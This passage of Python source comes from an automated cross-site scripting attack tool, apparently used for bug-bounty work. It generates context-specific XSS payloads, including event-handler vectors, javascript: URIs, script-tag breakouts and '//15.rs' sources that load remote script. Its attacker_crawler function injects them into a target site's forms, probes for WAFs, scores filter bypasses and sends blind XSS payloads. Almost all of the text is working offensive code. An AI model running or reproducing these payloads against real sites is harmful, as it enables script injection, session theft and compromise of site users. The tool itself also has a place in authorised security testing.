            if quoteEfficiency == 100:
                for filling in fillings:
                    for function in functions:
                        vector = (
                            quote
                            + filling
                            + random_upper("autofocus")
                            + filling
                            + random_upper("onfocus")
                            + "="
                            + quote
                            + function
                        )
                        found = True
                        vectors[8].add(vector)
            if quoteEfficiency == 90:
                for filling in fillings:
                    for function in functions:
                        vector = (
                            "\\"
                            + quote
                            + filling
                            + random_upper("autofocus")
                            + filling
                            + random_upper("onfocus")
                            + "="
                            + function
                            + filling
                            + "\\"
                            + quote
                        )
                        found = True
                        vectors[7].add(vector)
            if Type == "value":
                if attributeName == "srcdoc":
                    if occurences[i]["score"]["&lt;"]:
                        if occurences[i]["score"]["&gt;"]:
                            del ends[:]
                            ends.append("%26gt;")
                        payloads = genGen(
                            fillings,
                            eFillings,
                            lFillings,
                            eventHandlers,
                            tags,
                            functions,
                            ends,
                        )
                        for payload in payloads:
                            found = True
                            vectors[9].add(payload.replace("<", "%26lt;"))
                elif attributeName == "href" and attributeValue == xsschecker:
                    for function in functions:
                        found = True
                        vectors[10].add(random_upper("javascript:") + function)
                elif attributeName.startswith("on"):
                    closer = js_contexter(attributeValue)
                    quote = ""
                    for char in attributeValue.split(xsschecker)[1]:
                        if char in ["'", '"', "`"]:
                            quote = char
                            break
                    suffix = "//\\"
                    for filling in jFillings:
                        for function in functions:
                            vector = quote + closer + filling + function + suffix
                            if found:
                                vectors[7].add(vector)
                            else:
                                vectors[9].add(vector)
                    if quoteEfficiency > 83:
                        suffix = "//"
                        for filling in jFillings:
                            for function in functions:
                                if "=" in function:
                                    function = "(" + function + ")"
                                if quote == "":
                                    filling = ""
                                vector = (
                                    "\\" + quote + closer + filling + function + suffix
                                )
                                if found:
                                    vectors[7].add(vector)
                                else:
                                    vectors[9].add(vector)
                elif tag in ("script", "iframe", "embed", "object"):
                    if (
                        attributeName in ("src", "iframe", "embed")
                        and attributeValue == xsschecker
                    ):
                        payloads = ["//15.rs", "\\/\\\\\\/\\15.rs"]
                        for payload in payloads:
                            vectors[10].add(payload)
                    elif (
                        tag == "object"
                        and attributeName == "data"
                        and attributeValue == xsschecker
                    ):
                        for function in functions:
                            found = True
                            vectors[10].add(random_upper("javascript:") + function)
                    elif quoteEfficiency == greatBracketEfficiency == 100:
                        payloads = genGen(
                            fillings,
                            eFillings,
                            lFillings,
                            eventHandlers,
                            tags,
                            functions,
                            ends,
                        )
                        for payload in payloads:
                            payload = quote + ">" + random_upper("</script/>") + payload
                            found = True
                            vectors[11].add(payload)
        elif context == "comment":
            lessBracketEfficiency = occurences[i]["score"]["<"]
            greatBracketEfficiency = occurences[i]["score"][">"]
            ends = ["//"]
            if greatBracketEfficiency == 100:
                ends.append(">")
            if lessBracketEfficiency == 100:
                payloads = genGen(
                    fillings, eFillings, lFillings, eventHandlers, tags, functions, ends
                )
                for payload in payloads:
                    vectors[10].add(payload)
        elif context == "script":
            if scripts:
                try:
                    script = scripts[index]
                except IndexError:
                    script = scripts[0]
            else:
                continue
            closer = js_contexter(script)
            quote = occurences[i]["details"]["quote"]
            scriptEfficiency = occurences[i]["score"]["</scRipT/>"]
            greatBracketEfficiency = occurences[i]["score"][">"]
            breakerEfficiency = 100
            if quote:
                breakerEfficiency = occurences[i]["score"][quote]
            ends = ["//"]
            if greatBracketEfficiency == 100:
                ends.append(">")
            if scriptEfficiency == 100:
                breaker = random_upper("</script/>")
                payloads = genGen(
                    fillings, eFillings, lFillings, eventHandlers, tags, functions, ends
                )
                for payload in payloads:
                    vectors[10].add(payload)
            if closer:
                suffix = "//\\"
                for filling in jFillings:
                    for function in functions:
                        vector = quote + closer + filling + function + suffix
                        vectors[7].add(vector)
            elif breakerEfficiency > 83:
                prefix = ""
                suffix = "//"
                if breakerEfficiency != 100:
                    prefix = "\\"
                for filling in jFillings:
                    for function in functions:
                        if "=" in function:
                            function = "(" + function + ")"
                        if quote == "":
                            filling = ""
                        vector = prefix + quote + closer + filling + function + suffix
                        vectors[6].add(vector)
            index += 1
    return vectors


def attacker_crawler(
    scheme, host, main_url, form, blindPayloads, encoding, config, proxy
):
    """Attacks a web application by crawling and testing XSS vulnerabilities.

    Args:
        scheme (str): The scheme (http or https) of the target web application.
        host (str): The host of the target web application.
        main_url (str): The main URL of the target web application.
        form (dict): The form data of the target web application.
        blindPayloads (str): The blind payload to test for blind XSS vulnerabilities.
        encoding (str): The encoding to use for the payloads.
        config (dict): The configuration settings for the attack.
        proxy (str): The proxy server to use for the attack.
    """
    if form:
        cprint(f"Attacking forms: {form}", "green", file=sys.stderr)
        for each in form.values():
            url = each["action"]
            if url:
                if url.startswith(main_url):
                    pass
                elif url.startswith("//") and url[2:].startswith(host):
                    url = scheme + "://" + url[2:]
                elif url.startswith("/"):
                    url = scheme + "://" + host + url
                elif re.match(r"\w", url[0]):
                    url = scheme + "://" + host + "/" + url
                if url not in checkedForms:
                    checkedForms[url] = []
                method = each["method"]
                GET = True if method == "get" else False
                inputs = each["inputs"]
                paramData = {}
                for one in inputs:
                    paramData[one["name"]] = one["value"]
                    for paramName in paramData.keys():
                        if paramName not in checkedForms[url]:
                            checkedForms[url].append(paramName)
                            paramsCopy = copy.deepcopy(paramData)
                            paramsCopy[paramName] = xsschecker

                            is_waffed = waf_detector(proxy, url, config)
                            if is_waffed:
                                cprint(
                                    "WAF detected: %s%s%s" % (green, is_waffed, end),
                                    color="red",
                                    file=sys.stderr,
                                )
                            else:
                                cprint(
                                    "WAF Status: %sOffline%s" % (green, end),
                                    color="green",
                                    file=sys.stderr,
                                )

                            headers = {
                                "User-Agent": random.choice(USER_AGENTS),
                                "X-HackerOne-Research": "elniak",
                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                "Accept-Language": "en-US,en;q=0.5",
                                "Accept-Encoding": "gzip,deflate",
                                "cache-control": "max-age=0",
                                "Connection": "close",
                                "DNT": "1",
                                "Upgrade-Insecure-Requests": "1",
                            }
                            # TODO add session
                            proxies = prepare_proxies(proxy, config)
                            cprint(
                                f"Testing attack for {'GET' if GET else 'POST'} - Session (n° 0): {url} \n\t - parameters {paramsCopy} \n\t - headers {headers} \n\t - xss - with proxy {proxies} ...",
                                "yellow",
                                file=sys.stderr,
                            )

                            response = start_request(
                                config=config,
                                proxies=proxies,
                                data=[paramsCopy],
                                base_url=url,
                                params=paramsCopy,
                                headers=headers,
                                GET=GET,
                            )

                            occurences = html_xss_parser(response, encoding)
                            cprint(
                                "Scan occurences: {}".format(occurences),
                                "green",
                                file=sys.stderr,
                            )
                            if not occurences:
                                cprint(
                                    "No XSS reflection found", "yellow", file=sys.stderr
                                )
                                continue
                            else:
                                cprint(
                                    "XSS reflections found: %i" % len(occurences),
                                    "green",
                                    file=sys.stderr,
                                )
                            cprint("Analysing reflections:", "green", file=sys.stderr)
                            positions = occurences.keys()
                            occurences = check_filter_efficiency(
                                config,
                                proxy,
                                url,
                                paramsCopy,
                                GET,
                                occurences,
                                encoding,
                            )

                            cprint(
                                "Scan efficiencies: {}".format(occurences),
                                "green",
                                file=sys.stderr,
                            )
                            cprint("Generating payloads:", "green", file=sys.stderr)

                            vectors = generator(occurences, response.text)
                            with lock_processed:
                                write_xss_vectors(
                                    vectors,
                                    os.path.join(
                                        config["experiment_folder"], "xss_vectors.txt"
                                    ),
                                )
                            if vectors:
                                for confidence, vects in vectors.items():
                                    try:
                                        payload = list(vects)[0]
                                        cprint(
                                            "[Potential Vulnerable Webpage] - %s%s%s"
                                            % (green, url, end),
                                            color="green",
                                            file=sys.stderr,
                                        )
                                        cprint(
                                            "\tVector for %s%s%s: %s"
                                            % (green, paramName, end, payload),
                                            color="green",
                                            file=sys.stderr,
                                        )
                                        cprint(
                                            "\tConfidence: %s%s%s"
                                            % (green, confidence, end),
                                            color="green",
                                            file=sys.stderr,
                                        )
                                        # Only test most confident payloads ?
                                        # TODO perform the attacks
                                        break
                                    except IndexError:
                                        pass
                            if config["blind_xss"] and blindPayloads:
                                for blindPayload in blindPayloads:
                                    paramsCopy[paramName] = blindPayload
                                    cprint(
                                        f"Testing blind XSS attack for {'GET' if GET else 'POST'} with blind payload - Session (n° 0): {url} \n\t - parameters {paramsCopy} \n\t - headers {headers} \n\t - xss - with proxy {proxies} ...",
                                        "yellow",
                                        file=sys.stderr,
                                    )
                                    proxies = prepare_proxies(proxy, config)
                                    response = start_request(
                                        proxies=proxies,
                                        config=config,
                                        base_url=url,
                                        params=paramsCopy,
                                        headers=headers,
                                        GET=GET,
                                    )
                                    if response:
                                        cprint(
                                            "Response blind XSS: %s" % response.text,
                                            "green",
                                            file=sys.stderr,
                                        )
                                    else:
                                        cprint(
                                            "Response blind XSS: %s" % response,
                                            "green",
                                            file=sys.stderr,
                                        )


# def xss_attack(
#     config,
#     proxy,
#     vects,
#     url,
#     params,
#     GET,
#     environment,
#     positions,
#     encoding,
#     skip=False,
#     minEfficiency=95,
#     confidence=10,
# ):
#     for vec in vects:
#         if config["update_path"]:
#             vect = vect.replace("/", "%2F")
#         loggerVector = vect
#         progress += 1
#         logger.run("Progress: %i/%i\r" % (progress, total))
#         if not GET:
#             vect = unquote(vect)

#         efficiencies = checker(
#             config,
#             proxy,
#             url,
#             params,
#             GET,
#             environment,
#             positions,
#             encoding,
#         )
#         if not efficiencies:
#             for i in range(len(occurences)):
#                 efficiencies.append(0)

#         bestEfficiency = max(efficiencies)
#         if bestEfficiency == 100 or (vect[0] == "\\" and bestEfficiency >= 95):
#             logger.red_line()
#             logger.good("Payload: %s" % loggerVector)
#             logger.info("Efficiency: %i" % bestEfficiency)
#             logger.info("Confidence: %i" % confidence)
#             if not skip:
#                 choice = input(
#                     "%s Would you like to continue scanning? [y/N] " % que
#                 ).lower()
#             if skip or choice != "y":
#                 return target, loggerVector
#         elif bestEfficiency > minEfficiency:
#             logger.red_line()
#             logger.good("Payload: %s" % loggerVector)
#             logger.info("Efficiency: %i" % bestEfficiency)
#             logger.info("Confidence: %i" % confidence)
